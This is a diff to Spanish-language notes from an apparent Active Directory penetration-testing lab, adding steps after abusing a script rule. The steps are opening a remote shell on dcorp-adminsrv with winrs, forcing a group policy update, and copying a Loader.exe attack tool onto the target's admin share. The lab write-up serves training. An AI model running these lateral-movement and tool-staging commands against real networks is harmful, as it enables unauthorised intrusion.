@@ -735,7 +735,25 @@ En las reglas de scripts vemos que cualquioera puede ejecutar scripts firmados p
 
 Eliminaremos la regla ejecutable por que la regla de scripts es la que acabamos de abusar de ella
 Ahora podemos esperar a la actualizacion de la directiva de grupo, o forzarla en la maquina *dcorp-adminsrv*
-Lo haremos desde nuestra maquina estudianter
+Lo haremos desde nuestra maquina estudiante, conectandonos a *adminsrv*
+```shell
+[student97]
+winrs -r:dcorp-adminsrv cmd
+```
+
+Forzaremos la actualizacion de las GPO
+```shell
+[dcorp-adminsrv]
+gpupdate /force
+```
+Ahora copiaremos el *Loader* a la maquina
+```shell
+[student97]
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
+```
+
+
+
 
 
 
